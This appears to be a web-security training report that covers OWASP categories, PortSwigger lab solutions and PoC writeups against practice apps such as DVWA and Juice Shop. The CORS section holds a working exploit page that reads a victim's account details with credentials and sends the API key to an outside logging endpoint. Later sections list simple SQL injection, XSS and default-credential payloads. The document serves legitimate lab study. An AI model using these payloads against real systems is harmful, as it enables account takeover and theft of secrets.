#  Advanced Testing & PoC

## 1. Security Misconfiguration

Description : Improper configuration of server/application. 
Security Misconfiguration happens when an application, server, or database is configured insecurely, leaving it vulnerable to attacks. This is one of the most common vulnerabilities in the OWASP Foundation Top 10.

Common Examples : 

- Default usernames and passwords
- Unnecessary services enabled
- Improper file permissions
- Missing security headers
- Exposed admin panels
- Debug mode enabled in production
- Testing Performed
- Checked HTTP security headers
- Identified default configurations
- Scanned for exposed directories/files
- Tested insecure server settings
- Verified software versions for outdated components

Tools Used : 
- Burp Suite
- OWASP ZAP
- Browser Developer Tools

Remediation : 
- Disable unnecessary services and features
- Use strong authentication settings
- Configure secure HTTP headers
- Remove default credentials
- Keep software updated regularly

Impact : Full system compromise

Fix :
- Disable debug
- Harden server

### Screenshot :

### Portswigger Lab: CORS vulnerability with trusted null origin :

<img width="1918" height="968" alt="Screenshot_2026-05-09_05_22_06" src="https://github.com/user-attachments/assets/5caa0a8c-32da-4914-88de-b5cd76c80573" />


### Solution :

Target Goal - exploit the CORS misconfiguration to retrieve the administrator's API key

Creds - wiener:peter

Analysis:

Testing for CORS misconfigurations:
1. Change the origin header to an arbitrary value 
2. Change the origin header to the null value
3. Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
4. Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.

Code used : 

<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://ac371f531f693ef3c07b84de00630017.web-security-academy.net'
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
                }
            }
            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>"></iframe>
    </body>
</html>


## 2. Broken Access Control

Description : Broken Access Control occurs when users can access resources or perform actions beyond their authorized permissions.
Broken access control is a top-tier web security vulnerability (ranked #1 in OWASP Top 10:2025) where application restrictions are not properly enforced, allowing users to act outside their authorized permissions

Common Examples : 
- Accessing admin pages without authorization
- Viewing another user’s data
- Forced browsing to restricted URLs
- Privilege escalation attacks
- Missing role-based access control checks

Testing Performed : 
- Tested direct access to admin endpoints
- Modified user IDs in requests
- Checked horizontal and vertical privilege escalation
- Intercepted and modified requests using proxy tools

Tools Used : 
- Burp Suite
- Web browser session testing
- Manual parameter manipulation

Remediation : 
- Implement proper role-based access control (RBAC)
- Validate user permissions on the server side
- Deny access by default
- Use secure session management
- Regularly test authorization mechanisms


### Screenshot :


<img width="1918" height="968" alt="Screenshot_2026-05-10_07_20_21" src="https://github.com/user-attachments/assets/95f72acf-cdb0-486f-beb4-35427422a242" />


### Lab - User role controlled by request parameter

Target Goal - Access admin panel and use it to delete the user carlos.

The lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.
Solve the lab by accessing the admin panel and using it to delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter

#### Solution :

- Go to /admin and observe that you can't access the admin panel.
- Go to the login page.
- In Burp Proxy,check the response given my the /my-account.
- In /my-account url check "Cookie : Admin : False"
- Observe that the response sets the cookie Admin=false. Change it to Admin=true.
- Load the admin panel and delete carlos




# Proof of Concept (PoC) Reports


## PoC 1: DVWA / Juice Shop Setup Verification

#### Objective : Set up a vulnerable web application environment for penetration testing practice.

### Environment Used : 
- DVWA
- OWASP Juice Shop
- Kali Linux / Windows
- XAMPP or Docker
- Burp Suite

### Steps Performedb :
- Installed DVWA/Juice Shop locally.
- Configured database connection.
- Started Apache and MySQL services.
- Verified application access in browser.
- Configured Burp Suite proxy with browser.

### Result : 
The vulnerable web application environment was successfully deployed and accessible for security testing.




## PoC 2: Reconnaissance & Spidering Using Burp Suite

#### Objective : Identify application endpoints and hidden pages.

### Steps to Reproduce :
- Open Burp Suite and enable proxy interception.
- Visit the target web application.
- Browse through multiple pages manually.
- Use Burp Spider/Crawler to map the application.
- Analyze discovered URLs and parameters.

### Findings : 
- Login pages identified
- Hidden directories discovered
- Parameters available for testing
- Session cookies captured

### Impact : 
Reconnaissance helps attackers understand the application structure and identify attack surfaces.

### Recommendation : 
- Disable unnecessary endpoints
- Restrict directory listing
- Use proper access controls




## PoC 3: SQL Injection (SQLi)

### Vulnerability : SQL Injection

#### Description : User input was not sanitized properly, allowing SQL queries to be manipulated.

### Steps to Reproduce : 
- Navigate to the login/input page.
- Enter the payload:
- ' OR '1'='1
- Submit the request.
- Authentication bypass/data retrieval occurs.

### Result : 
Database queries were manipulated successfully.

### Impact :
- Attackers may:
    Bypass authentication
    Read sensitive data
    Modify database content

### Remediation :
- Use prepared statements
- Implement parameterized queries
- Validate user input
- PoC 4: Broken Authentication



## PoC 4 : Weak Authentication Mechanism

### Vulnerability : Weak Authentication Mechanism

#### Description : Weak credentials and improper session management allowed unauthorized access.

### Steps to Reproduce: 
- Attempt login with default credentials:
- admin:admin
- Observe successful login.
- Session token remained active after logout.


### Result : 
Authentication weakness identified.

### Impact :
Attackers can gain unauthorized access to user accounts.

### Remediation : 
- Enforce strong passwords
- Enable MFA
- Implement secure session expiration



## PoC 5: Cross-Site Scripting (XSS)

### Vulnerability : Reflected/Stored XSS

#### Description : The application failed to sanitize user input before rendering it in the browser.

### Steps to Reproduce: 
- Enter the payload:
    <script>alert('XSS')</script>
- Submit the form/input field.
- JavaScript executed in browser.

### Result
XSS vulnerability successfully exploited.

### Impact

#### Attackers can:

- Steal session cookies
- Redirect users
- Execute malicious scripts
- Remediation
- Sanitize user input
- Encode output properly
- Use Content Security Policy (CSP)



## PoC 6: Sensitive Data Exposure

### Vulnerability : Sensitive Information Disclosure

#### Description : Sensitive information was transmitted or stored insecurely.

### Steps to Reproduce : 

- Intercept HTTP traffic using Burp Suite.
- Observe sensitive data transmitted over HTTP.
- Identify exposed credentials/session tokens.

### Result
Sensitive data exposure confirmed.

### Impact

#### Attackers may steal:

- User credentials
- Session cookies
- Personal information

### Remediation
- Use HTTPS/TLS
- Encrypt sensitive data
- Avoid exposing sensitive information in responses



## PoC 7: Security Misconfiguration

### Vulnerability :  Improper Security Configuration

#### Description : The server/application used insecure default settings.

### Steps to Reproduce :

- Scan application responses using Burp Suite.
- Observe missing security headers:
- X-Frame-Options
- Content-Security-Policy
- Identify exposed directories and debug information.

### Result
Security misconfiguration identified successfully.

### Impact
Attackers can exploit insecure settings to compromise the application.

### Remediation

- Remove default configurations
- Hide debug information
- Configure secure HTTP headers



## PoC 8: Broken Access Control

### Vulnerability : Unauthorized Access to Restricted Resources

#### Description : Application failed to enforce authorization checks properly.

### Steps to Reproduce : 
- Login as a normal user.
- Modify URL from:
- $ /user/profile to $ /admin/dashboard
- Access granted without authorization.

### Result
Privilege escalation vulnerability identified.

### Impact
Attackers may access administrative functions and sensitive data.

### Remediation
- Implement server-side authorization checks
- Apply Role-Based Access Control (RBAC)
- Deny access by default
